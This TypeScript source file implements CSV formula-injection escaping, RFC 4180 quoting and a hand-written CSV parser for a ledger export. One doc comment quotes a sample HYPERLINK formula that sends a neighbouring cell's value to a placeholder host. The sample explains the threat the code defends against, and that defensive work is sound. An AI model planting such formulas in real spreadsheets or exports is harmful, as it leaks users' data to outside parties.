/**
 * The two rules that make an exported file safe to open and safe to read back.
 *
 * Both of them exist because of a specific way a ledger file can go wrong, and
 * both are pure functions so they can be tested without a spreadsheet, a
 * database or a server.
 */

/**
 * Characters that make a spreadsheet treat a cell as a formula.
 *
 * The attack is real and it is not about our data being wrong: a note reading
 * `=HYPERLINK("http://example.invalid/?x="&A1,"点我")` is a perfectly innocent
 * string until Excel decides to execute it. The file then leaks the row it was
 * written next to, or invites the reader to click something they should not.
 */
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/** A cell that begins with one of those characters. */
export function startsFormula(value: string): boolean {
  const first = value.slice(0, 1);
  return FORMULA_TRIGGERS.includes(first);
}

/**
 * Neutralise a text cell for export.
 *
 * A leading apostrophe is the spreadsheet convention for "this is text, not a
 * formula", and every reader this project cares about honours it. It is applied
 * to **text columns only** — a number that needs an apostrophe to survive is a
 * number that can no longer be summed, and an export whose amounts cannot be
 * summed has failed at its main job.
 */
export function escapeFormula(value: string): string {
  return startsFormula(value) ? `'${value}` : value;
}

/**
 * Undo `escapeFormula` when a file comes back in.
 *
 * Without this, a round trip would grow a quote mark every time: export adds
 * one, import stores it, the next export adds another. The removal is
 * deliberately narrow — only a leading apostrophe on a value that would
 * otherwise be treated as a formula — so a note that genuinely starts with an
 * apostrophe keeps it.
 */
export function unescapeFormula(value: string): string {
  if (!value.startsWith("'")) return value;
  return startsFormula(value.slice(1)) ? value.slice(1) : value;
}

// ---------------------------------------------------------------------------
// CSV
// ---------------------------------------------------------------------------

/**
 * One CSV field.
 *
 * RFC 4180 quoting only — **no formula escaping here**, and that is a deliberate
 * correction. An earlier version escaped inside this function, which meant a
 * negative amount (`-38.5`) came out as `'-38.5`: a ledger whose amounts are
 * text cannot be summed, and that is the one thing an export must not do. The
 * rule the owner stated is that escaping applies to **text columns only**, and
 * the only place that knows which column is which is the caller.
 *
 * So: this function makes the field *parseable*; the caller makes it *safe*.
 */
export function csvField(value: string | number | null | undefined): string {
  const text = value === null || value === undefined ? "" : String(value);

  const needsQuotes =
    text.includes(",") || text.includes('"') || text.includes("\n") || text.includes("\r");

  return needsQuotes ? `"${text.replace(/"/g, '""')}"` : text;
}

/** One CSV row, without a line ending. */
export function csvRow(values: readonly (string | number | null | undefined)[]): string {
  return values.map(csvField).join(",");
}

/**
 * One CSV row for a file whose text columns may contain user-typed values.
 *
 * `textColumns` are escaped, numbers are left exactly as they are. This is the
 * combination the export needs, and stating it at the call site is what keeps
 * the two rules from being confused for one another again.
 */
export function csvRowEscaped(
  values: readonly (string | number | null | undefined)[],
  textColumns: readonly number[],
): string {
  return values
    .map((value, index) => {
      if (typeof value === "number" || !textColumns.includes(index)) return csvField(value);
      return csvField(escapeFormula(value === null || value === undefined ? "" : String(value)));
    })
    .join(",");
}

/**
 * Split CSV text into rows.
 *
 * Hand-written rather than pulled from a package, for the same reason the
 * browser writes its own UUID v7: the whole of what this needs is RFC 4180, and
 * a dependency would have to be audited to know that is all it does. The state
 * machine below handles quoted fields, escaped quotes, embedded newlines and
 * both line endings.
 *
 * A byte-order mark is stripped if present — we write one, Excel writes one,
 * and a BOM left on the first header would make that column unrecognisable.
 */
export function parseCsv(text: string): string[][] {
  const input = text.startsWith("\uFEFF") ? text.slice(1) : text;

  const rows: string[][] = [];
  let row: string[] = [];
  let field = "";
  let quoted = false;
  let index = 0;

  const endField = (): void => {
    row.push(field);
    field = "";
  };

  const endRow = (): void => {
    endField();
    rows.push(row);
    row = [];
  };

  while (index < input.length) {
    const char = input[index]!;

    if (quoted) {
      if (char === '"') {
        if (input[index + 1] === '"') {
          field += '"';
          index += 2;
          continue;
        }
        quoted = false;
        index += 1;
        continue;
      }
      field += char;
      index += 1;
      continue;
    }

    if (char === '"' && field === "") {
      quoted = true;
      index += 1;
      continue;
    }

    if (char === ",") {
      endField();
      index += 1;
      continue;
    }

    if (char === "\r" || char === "\n") {
      endRow();
      index += char === "\r" && input[index + 1] === "\n" ? 2 : 1;
      continue;
    }

    field += char;
    index += 1;
  }

  // A file that does not end with a newline still has a last row; an empty
  // trailing line does not.
  if (field !== "" || row.length > 0) endRow();

  return rows;
}
